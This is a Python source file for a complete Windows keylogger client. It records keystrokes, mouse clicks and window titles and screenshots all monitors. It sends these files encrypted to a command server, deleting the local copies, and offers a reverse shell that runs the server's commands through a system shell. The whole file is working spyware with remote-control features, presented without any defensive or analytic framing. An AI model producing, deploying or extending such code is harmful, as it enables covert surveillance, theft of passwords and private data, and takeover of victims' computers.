# -*- coding: utf-8 -*-
import keyboard
import logging
import mouse
import os
import platform
import pyautogui
import socket
import subprocess
import time
import utils
from datetime import datetime, timedelta
from functools import partial
from PIL import ImageGrab
from screeninfo import get_monitors
from threading import Thread
from win32gui import GetWindowText, GetForegroundWindow

class Keylogger:
    def __init__(self, log_interval, window_interval, reconnect_interval):
        self.active = False
        self.connected = False
        self.filecounter = 0

        self.log_interval = log_interval
        self.log = ""

        self.window_interval = window_interval
        self.foreground_window = ""

        self.start_time = datetime.now()
        self.end_time = datetime.now()

        self.reconnect_interval = reconnect_interval
        self.sock = None
        self.host = "127.0.0.1"
        self.port = 1005

        self.log_directory = "tmp" #"C:\\tmp"

        ImageGrab.grab = partial(ImageGrab.grab, all_screens=True) # Take Screenshots of all Screens at once

#--------------- CALLBACK METHODS ---------------#
    def keyboard_callback(self, event):
        if self.active:
            name = event.name
            if len(name) > 1:
                if name == "space":
                    name = " "
                elif name == "enter":
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            self.log += name

    def mouse_left_callback(self):
        if self.active:
            self.log += f"[L_CLICK, {mouse.get_position()}]"

    def mouse_right_callback(self):
        if self.active:
            self.log += f"[R_CLICK, {mouse.get_position()}]"

#--------------- FILE METHODS ---------------#
    def write_information_file(self):
        if not os.path.exists(self.log_directory):
                os.makedirs(self.log_directory)

        filename = f"information-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
        with open(os.path.join(self.log_directory, filename), "w+", encoding=utils.ENCODING) as file:
            uname = platform.uname()

            file.write("Monitors:\n")
            for monitor in get_monitors():
                file.write((
                        f"\tname: {monitor.name}\n"
                        f"\tx: {monitor.x}\n"
                        f"\ty: {monitor.y}\n"
                        f"\twidth (pixel): {monitor.width}\n"
                        f"\theight (pixel): {monitor.height}\n"
                        f"\twidth (mm): {monitor.width_mm}\n"
                        f"\theight (mm): {monitor.height_mm}\n"
                        f"\tis primary?: {monitor.is_primary}\n\n"
                    ))
            file.write((
                        f"System: {uname.system}\n"
                        f"Node Name: {uname.node}\n"
                        f"Release: {uname.release}\n"
                        f"Version: {uname.version}\n"
                        f"Machine: {uname.machine}\n"
                        f"Processor: {uname.processor}\n"
                    ))

    def write_keylogs_to_file(self, foreground_window):
        if self.log:
            if not os.path.exists(self.log_directory):
                os.makedirs(self.log_directory)

            filename = f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
            with open(os.path.join(self.log_directory, filename), "w", encoding=utils.ENCODING) as file:
                file.write((
                        f"Foreground Window: {foreground_window}\n"
                        f"Starttime: {self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
                        f"Endtime: {self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
                        f"Filecounter: {self.filecounter}\n"
                        f"------------------------\n\n"
                        f"{self.log}"
                    ))
            self.start_time = datetime.now()
        self.log = ""

    def screenshot(self):
        if not os.path.exists(self.log_directory):
                os.makedirs(self.log_directory)
        
        filename = f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png"
        pyautogui.screenshot(os.path.join(self.log_directory, filename))

#--------------- SERVER METHODS ---------------#
    def connect_to_host(self):
        self.sock = socket.socket()
        while not self.connected:
            try:
                self.sock.connect((self.host, self.port))
                logging.debug("Connected")
                self.connected = True
            except socket.error as err:
                self.connected = False
                logging.debug(err)
                time.sleep(self.reconnect_interval)
                
    def encrypt_and_send(self, data: bytes):
        encrypted_data = utils.encrypt(data)
        while True:
            try:
                self.sock.sendall(encrypted_data)
                break
            except socket.error as err:
                self.connected = False
                logging.debug(err)
                self.connect_to_host()

    def send_header_to_server(self, number_of_chunks, filename, number_of_files_left):
        header = "__".join([number_of_chunks, filename, number_of_files_left]).encode(utils.ENCODING)
        self.encrypt_and_send(header)        

    def send_message_to_server(self, data: str):
        chunk_size = utils.BUFFSIZE-96
        data = data.encode(utils.ENCODING)
        chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] # split data in chunks of chunk_size to send them one by one

        self.send_header_to_server(str(len(chunks)), "", "")
        
        for chunk in chunks:
            self.encrypt_and_send(chunk)
            time.sleep(0.001)
            
    def send_files_to_server(self, files: list):
        chunk_size = utils.BUFFSIZE-96
        number_of_files = len(files)

        for index, file in enumerate(files):
            data = read_file_and_delete(file)
            chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] # split data in chunks of chunk_size to send them one by one

            number_of_chunks = str(len(chunks))
            filename = os.path.split(file)[1]
            number_of_files_left = str(number_of_files-index-1)
            
            self.send_header_to_server(number_of_chunks,filename,number_of_files_left)            

            for chunk in chunks:
                self.encrypt_and_send(chunk)
                time.sleep(0.005)

    def receive_command_from_server(self):
        try:
            recv = self.sock.recv(utils.BUFFSIZE)
            plaintext = utils.decrypt(recv).decode(utils.ENCODING)
            return plaintext
        except (socket.error, AttributeError) as err:
                self.connected = False
                logging.debug(err)
                self.connect_to_host()

#--------------- POLLING METHODS ---------------#
    def check_foreground_window(self):
        while True:
            if self.active:
                current_window = GetWindowText(GetForegroundWindow())
                timenow = datetime.now()

                if current_window != self.foreground_window:
                    self.write_keylogs_to_file(self.foreground_window)
                    self.screenshot()
                    self.foreground_window = current_window
                    self.filecounter = 0

                elif (timenow - self.start_time) >= timedelta(seconds=self.log_interval):
                    self.end_time = timenow
                    self.write_keylogs_to_file(current_window)
                    self.screenshot()
                    self.filecounter += 1

            time.sleep(self.window_interval)

#--------------- START / STOP ---------------#
    def activate(self):
        self.active = True
    
    def deactivate(self):
        self.active = False

    def start(self):
        self.write_information_file()

        keyboard.on_press(callback=self.keyboard_callback)
        mouse.on_click(callback=self.mouse_left_callback)
        mouse.on_right_click(callback=self.mouse_right_callback)

        t = Thread(target=self.check_foreground_window)
        t.daemon = True
        t.start()

    def stop(self):
        self.deactivate()
        self.sock.close()

#--------------- FUNCTIONS ---------------#
def read_file_and_delete(filename:str) -> bytes:
    if filename.endswith(".txt"):
        with open(filename, "r", encoding=utils.ENCODING) as file:
            data = file.read().encode(utils.ENCODING)
    elif filename.endswith(".png"):
        with open(filename, "rb") as file:
            data = file.read()
    os.remove(filename)
    return data

def execute_command(command:str) -> str:
    try:
        pipe = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, shell=True)
        stderr = pipe.stderr.read()
        stdout = pipe.stdout.read()
    except UnicodeDecodeError as err:
        stderr = str(err)

    if stderr:
        return stderr
    else:
        return stdout


#--------------- MAIN ---------------#
if __name__ == "__main__":
    reverse_shell_active = False
    keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
    keylogger.start()
    keylogger.connect_to_host()

    while True:
        recv = keylogger.receive_command_from_server()
        if recv:
            if reverse_shell_active:
                if recv == "exit":
                    reverse_shell_active = False
                    keylogger.send_message_to_server("reverse shell deactivated")
                else:
                    data = execute_command(recv)
                    keylogger.send_message_to_server(data)
            else:
                if recv == "activate":
                    keylogger.activate()
                    keylogger.send_message_to_server("logging activated")
                elif recv == "deactivate":
                    keylogger.deactivate()
                    keylogger.send_message_to_server("logging deactivated")
                elif recv == "send":
                    files = [os.path.join("tmp", i) for i in os.listdir("tmp")]
                    keylogger.send_files_to_server(files)
                elif recv == "shell":
                    reverse_shell_active = True
                    keylogger.send_message_to_server("reverse shell activated")
                elif recv == "stop":
                    keylogger.send_message_to_server("keylogger stopped")
                    keylogger.stop()
                    break
                else:
                    keylogger.send_message_to_server("unknown command")
                    logging.debug(f"unknown command: {recv}")
